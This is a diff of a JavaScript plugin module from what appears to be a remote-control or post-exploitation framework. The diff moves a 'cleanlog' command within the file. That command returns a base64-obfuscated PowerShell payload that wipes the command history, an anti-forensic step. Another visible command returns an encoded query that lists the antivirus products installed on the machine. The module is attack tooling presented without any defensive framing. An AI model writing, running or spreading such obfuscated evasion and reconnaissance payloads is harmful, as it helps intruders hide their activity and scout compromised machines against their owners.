@@ -4,6 +4,14 @@ module.exports = {
     type: 'client',
     description: 'A client plugin to profile the system.',
     commands: {
+        cleanlog: {
+            name: 'cleanlog',
+            method: 'payload-ps',
+            description: 'Cleans the powershell history and logs.',
+            handler: () => {
+                return `Q2xlYXItSGlzdG9yeSB8IFtNaWNyb3NvZnQuUG93ZXJTaGVsbC5QU0NvbnNvbGVSZWFkTGluZV06OkNsZWFySGlzdG9yeSgp`;
+            }
+        },
         whoami: {
             name: 'whoami',
             method: 'payload-ps',
@@ -74,14 +82,6 @@ module.exports = {
             description: `Returns the current antivirus product installed.`,
             handler: () => {
                 return `R2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2UgInJvb3QvU2VjdXJpdHlDZW50ZXIyIiAtQ2xhc3NOYW1lIEFudGlWaXJ1c1Byb2R1Y3Q=`;
-            }
-        },
-        cleanlog: {
-            name: 'cleanlog',
-            method: 'payload-ps',
-            description: 'Cleans the powershell history and logs.',
-            handler: () => {
-                return `Q2xlYXItSGlzdG9yeSB8IFtNaWNyb3NvZnQuUG93ZXJTaGVsbC5QU0NvbnNvbGVSZWFkTGluZV06OkNsZWFySGlzdG9yeSgp`;
             }
         },
         fwrules: {
